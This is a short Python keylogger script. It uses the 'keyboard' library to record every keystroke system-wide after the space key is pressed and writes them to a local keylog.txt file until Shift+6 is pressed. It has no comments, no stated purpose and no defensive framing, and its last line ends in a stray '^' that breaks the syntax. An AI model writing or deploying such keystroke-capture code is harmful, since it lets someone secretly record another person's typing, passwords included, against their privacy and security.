import os
import keyboard

log_location = os.path.dirname(__file__) + '\\keylog.txt'
logfile = open(log_location, 'w')
while(True):
    if(keyboard.is_pressed(' ')):
        logfile.write('## The logging begins ##\n\n')
        while(True):
            if keyboard.get_hotkey_name:
                a=keyboard.get_hotkey_name()
                print(a) 
                while keyboard.get_hotkey_name()==a: pass
                if 'shift+' in a:
                    a = a.replace('shift+', '')

                if 'space' in a:
                    a=' '

                if 'enter' in a:
                    a = '\n'

                if 'shift' in a or 'backspace' in a or 'ctrl' in a or '+' in a:
                    a = ''

                logfile.write(a)
            if(keyboard.is_pressed('Shift+6')): break
        break
logfile.write("\n\n## This is the end of the log##")
logfile.close()^